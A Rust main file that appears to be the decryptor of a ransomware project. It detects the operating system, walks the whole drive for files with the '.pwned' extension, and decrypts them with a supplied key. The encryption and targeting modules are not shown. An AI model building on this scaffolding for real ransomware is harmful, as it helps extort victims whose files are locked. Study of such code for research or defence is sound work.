mod decrypt;
mod targeting;
mod logger;
use clap::Parser;

#[derive(Parser)]
struct Cli {
    key_path: String // Path to the encrypted key file
}

fn main() -> Result<(), Box<dyn std::error::Error>>{
    // Parse command line arguments
    let args = Cli::parse();

    // Check if key_path is provided and is valid
    if args.key_path.is_empty() {
        eprintln!("Error: key_path is required");
        std::process::exit(1);
    }

    // Check if the key_path is a valid file
    if !std::path::Path::new(&args.key_path).exists() {
        eprintln!("Error: key_path does not exist");
        std::process::exit(1);
    }

    let family = std::env::consts::FAMILY;
    let logger = logger::Logger::new();
    logger.init_file_logging(".")?; // when deployed, should be a temp file

    let extension = "pwned"; // example extension

    if family == "windows" {
        logger.log("Windows OS detected");
        let _ = decrypt_windows(&logger, &args.key_path, &extension);
    } else if family == "unix" {
        logger.log("Linux OS detected");
        let _ = decrypt_linux(&logger, &args.key_path, &extension);
    } else {
        logger.log("No specific OS detected, defaulting to Linux");
        let _ = decrypt_linux(&logger, &args.key_path, &extension);
    }

    Ok(())
}

fn decrypt_windows(logger: &logger::Logger, key: &str, ext: &str) -> Result<(), Box<dyn std::error::Error>> {
    logger.log("Decrypting on Windows");
    // Implement Windows-specific decryption logic here
    let path = "C:"; 
    let decrypt_targets = targeting::discover_files_decrypt(&logger, &path, &ext)?;

    let _ = decrypt::decrypt(decrypt_targets, &logger, &key)?;
    logger.log("Decryption complete");

    Ok(())
}

fn decrypt_linux(logger: &logger::Logger, key: &str, ext: &str) -> Result<(), Box<dyn std::error::Error>> {
    logger.log("Decrypting on Linux");
    // Implement Linux-specific decryption logic here
    let path = "/";
    let files = targeting::discover_files_decrypt(logger, path, ext)?;

    let _ = decrypt::decrypt(files, &logger, &key)?;
    logger.log("Decryption complete");
    Ok(())
}
